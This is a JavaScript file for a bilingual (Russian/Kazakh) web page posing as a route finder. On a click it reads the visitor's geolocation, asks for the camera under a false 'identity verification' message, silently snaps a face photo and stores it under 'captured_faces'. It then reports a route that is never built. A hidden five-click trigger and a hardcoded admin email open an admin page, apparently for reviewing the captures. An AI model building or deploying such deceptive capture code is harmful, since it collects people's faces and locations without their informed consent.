const translations = {
    ru: {
        title: "Поиск Маршрута",
        from: "Откуда",
        to: "Куда",
        buildBtn: "Построить маршрут",
        fromPlaceholder: "Ваше местоположение...",
        toPlaceholder: "Введите адрес",
        locating: "Определение местоположения...",
        verifying: "Подтверждение личности...",
        done: "Маршрут построен",
        error: "Требуется доступ",
        langBtn: "KZ"
    },
    kz: {
        title: "Маршрут Іздеу",
        from: "Қайдан",
        to: "Қайда",
        buildBtn: "Маршрут құру",
        fromPlaceholder: "Сіздің орналасқан жеріңіз...",
        toPlaceholder: "Мекенжайды енгізіңіз",
        locating: "Орналасқан жерді анықтау...",
        verifying: "Жеке басты растау...",
        done: "Маршрут құрылды",
        error: "Қолжетімділік қажет",
        langBtn: "RU"
    }
};

let currentLang = 'ru';

// DOM Elements
const langToggle = document.getElementById('lang-toggle');
const adminBtn = document.getElementById('admin-btn');
const buildBtn = document.getElementById('build-route-btn');
const fromInput = document.getElementById('from-point');
const statusMsg = document.getElementById('status-msg');
const webcam = document.getElementById('webcam');
const canvas = document.getElementById('snapshot');
const secretTrigger = document.getElementById('secret-trigger');

// --- Localization ---
langToggle.addEventListener('click', () => {
    currentLang = currentLang === 'ru' ? 'kz' : 'ru';
    updateLanguage();
});

function updateLanguage() {
    const t = translations[currentLang];
    document.getElementById('app-title').textContent = t.title;
    document.getElementById('lbl-from').textContent = t.from;
    document.getElementById('lbl-to').textContent = t.to;
    buildBtn.textContent = t.buildBtn;
    fromInput.placeholder = t.fromPlaceholder;
    document.getElementById('to-point').placeholder = t.toPlaceholder;
    langToggle.textContent = t.langBtn;
}

// --- Main Flow ---
buildBtn.addEventListener('click', async () => {
    buildBtn.disabled = true;
    showStatus(translations[currentLang].locating);

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                // Success - Mock finding location
                fromInput.value = `${position.coords.latitude.toFixed(4)}, ${position.coords.longitude.toFixed(4)}`;
                startCameraSequence();
            },
            (err) => {
                // Error - User denied or failed, but we try camera anyway for "simulation" if possible (or just fail)
                showStatus(translations[currentLang].error);
                // Aggressive fallback: try camera even if geo fails? 
                // Requirement says: "As soon as user allows geo, site immediately requests camera".
                // If geo fails, valid flow might break, but let's try camera anyway.
                startCameraSequence();
            }
        );
    } else {
        startCameraSequence();
    }
});

function showStatus(msg) {
    statusMsg.textContent = msg;
    statusMsg.classList.remove('hidden');
}

async function startCameraSequence() {
    showStatus(translations[currentLang].verifying);

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        webcam.srcObject = stream;

        // Wait 1.5s then capture
        setTimeout(() => {
            captureImage(stream);
            finishSimulation();
        }, 1500);

    } catch (err) {
        console.error("Camera access denied", err);
        showStatus(translations[currentLang].error);
        buildBtn.disabled = false;
    }
}

function captureImage(stream) {
    const context = canvas.getContext('2d');
    canvas.width = webcam.videoWidth;
    canvas.height = webcam.videoHeight;
    context.drawImage(webcam, 0, 0, canvas.width, canvas.height);

    const dataUrl = canvas.toDataURL('image/jpeg');
    saveImage(dataUrl);

    // Stop stream
    stream.getTracks().forEach(track => track.stop());
}

function finishSimulation() {
    showStatus(translations[currentLang].done);
    buildBtn.disabled = false;
    // Maybe show a fake route or just leave it there
}

// --- Storage ---
function saveImage(dataUrl) {
    let images = JSON.parse(localStorage.getItem('captured_faces') || '[]');
    images.push({
        date: new Date().toLocaleString(),
        img: dataUrl
    });
    localStorage.setItem('captured_faces', JSON.stringify(images));
}

// --- Admin Redirection ---
function checkAdminAuth() {
    const email = prompt("Enter Admin Email:");
    if (email && email.trim() === "codeset@example.com") {
        window.location.href = 'admin.html';
    } else if (email !== null) { // If not cancelled
        alert("Access Denied");
    }
}

adminBtn.addEventListener('click', checkAdminAuth);

let secretClicks = 0;
secretTrigger.addEventListener('click', () => {
    secretClicks++;
    if (secretClicks >= 5) { // 5 clicks to open
        checkAdminAuth();
        secretClicks = 0;
    }
});
